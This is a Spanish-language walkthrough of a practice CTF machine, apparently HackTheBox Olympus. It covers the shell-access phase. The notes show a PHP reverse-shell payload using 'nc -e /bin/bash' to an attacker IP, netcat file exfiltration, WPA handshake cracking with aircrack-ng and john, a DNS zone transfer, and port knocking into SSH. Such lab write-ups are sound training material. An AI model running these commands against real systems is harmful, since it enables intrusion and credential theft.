## Explotacion de vulnerabilidad & Ganando acceso {-}


### Ganando acceso con la vuln XDebug {-}

1. Nos ponemos en escucha con netcat

    ```bash
    nc -nlvp 443
    ```

1. Con el exploit exploit_shell.py lanzamos una reverse shell

    ```php
    system('nc -e /bin/bash 10.10.14.20 443')
    ```

De esta manera, hemos ganado acceso al equipo.

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <numero de filas> columns <numero de columnas>
```

### Investigamos la maquina {-}

```bash
cd /home
#Output
zeus

ls /home/zeus
#Output
airgeddon
```

### Airgeddon.cap crack with Aircrack-ng {-}

Airgeddon es una suite de utilidades para hacer auditorias wifi. Entrando en el repertorio airgeddon del usuario zeus encontramos
otro repertorio llamado captured. Filtrando el contenido del directorio aigedon por ficheros `find \-type f` encontramos un fichero 
**captured.cap** 

Vamos a transferir el fichero captured.cap a nuestro equipo de atacante

1. En la maquina de atacante

    ```bash
    nc -nlvp 443 > captured.cap
    ```

1. En el contenedor

    ```bash
    nc 10.10.14.28 443 < captured.cap
    ```

Sabiendo que Airgeddon es una utilidad de auditoria wifi intentamos ver lo que contiene el **captured.cap** con la utilidad **aircrack-ng**.

```bash
aircrack-ng captured-cap
```

```{r, echo = FALSE, fig.cap="aircrack-ng sobre airgeddon capture", out.width="90%"}
    knitr::include_graphics("images/aircrack-airgeddon.png")
```

Se ve un ESSID que se llama `To_cl0se_to_th3_Sun` que parece turbio, y un handshake que significa que alguien a esperado que una victima se connecte
o reconecte tras un ataque de deautentificacion y a recuperado el hash de autentificacion.

Analizando la captura con **tshark** se ve que a sido un ataque de deautentificacion

```bash
tshark -r captured.cap 2>/dev/null
```

o filtrado por deautentificacion

```bash
tshark -r captured.cap -Y "wlan.fc.type_subtype==12" -Tfields -e wlan.da 2>/dev/null
```

#### Crackeo con Aircrack-ng {-}

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt captrured.cap
```

Este crack duraria aprox una hora.

Con investigacion S4vi a pillado una palabra flight en un fichero .txt y buscando por el dios griego del vuelo
encontro que este dios seria icarus.

Para ganar tiempo, se crea un diccionario mas pequeñito que contiene la palabra *icar*

```bash
grep "icar" /usr/share/wordlists/rockyou.txt > dictionary.txt
```

```bash
aircrack-ng -w dictionary.txt captured.cap
```

Ya encontramos la contraseña.

#### Crackeo con John {-}

Extraemos lo que nos interesa del fichero **captured.cap** en un fichero mas pequeñito que se llama Captura.hccap que con la utilidad
**hccap2john** no permite transformarlo en un hash compatible con **John**

```bash
aircrack-ng -J Captura captured.cap
hccap2john Captura.hccap > hash
john -wordlist=/usr/share/wordlists/rockyou.txt hash
```

### Conexion a la maquina victima{-}

Ahora que tenemos un usuario potencial y una contraseña, intentamos conectar con ssh al puerto 2222

```bash
ssh icarus@10.10.10.83
```

Con la contraseña encontrada no nos funciona.
Intentamos con el nombre turbio de esta red inalambrica como contraseña.

**Y PA DENTRO**

### Investigacion de la maquina victima {-}

Hay un fichero que contiene un nombre de dominio valido **ctfolympus.htb**

Intentamos poner el nombre del dominio en el `/etc/hosts` pero la web sigue siendo la misma.

Sabiendo que el puerto 53 esta abierto y teniendo ahora un nombre de dominio valido, podemos
hacer un ataque de transferencia de zona con **dig**

#### Ataque de transferencia de zona con dig {-}

El tito nos vuelve a decir que es muy importante no confundir la herramienta dig con dick. Dig esta en 
la categoria Ciencia y Tecnologia y la otra en la categoria HotTub ;)

```bash
dig @10.10.10.83 ctfolympus.htb
```

Como **dig** nos responde, ya podemos ir enumerando cosas

1. Enumerar los mail servers

    ```bash
    dig @10.10.10.83 ctfolympus.htb mx
    ```

1. Intentamos un ataque axfr

    ```bash
    dig @10.10.10.83 ctfolympus.htb axfr
    ```

    ```{r, echo = FALSE, fig.cap="dig ctfolympus.htb", out.width="90%"}
        knitr::include_graphics("images/dig-ctfolympus.png")
    ```

Se puede ver que hay un usuario y una contraseña potencial en un TXT con una lista de puertos.
La idea aqui seria de hacer un **Port Knocking**


### Port Knocking {-}

En este caso la idea seria conectarse al puerto 22 (es una suposicion). El problema es que este puerto esta cerrado. 
La idea de la tecnica de **Port Knocking** es que si el atacante golpea unos puertos en un orden definido, por
iptables se puede exponer o bloquear un puerto.

```bash
nmap -p3456,8234,62431,22 --open -T5 -v -n 10.10.10.83 -r
```

> [!] NOTAS: El argumento `-r` es para decir a NMAP de scanear los puertos en este mismo orden

Lanzando el comando multiples veces, NMAP nos reporta ahora que el puerto 22 esta ya abierto.
Lo que se puede hacer es, de seguida despues del **Port Knocking** con nmap, lanzar un comando
ssh a la maquina.

```bash
nmap -p3456,8234,62431,22 --open -T5 -v -n 10.10.10.83 -r && ssh prometheus@10.10.10.83
```

Perfecto se nos pregunta por una contraseña **Y PA DENTRO**

En este momento ya se puede ver la flag `user.txt` y Podemos pasar a la fase de escalacion de privilegios.
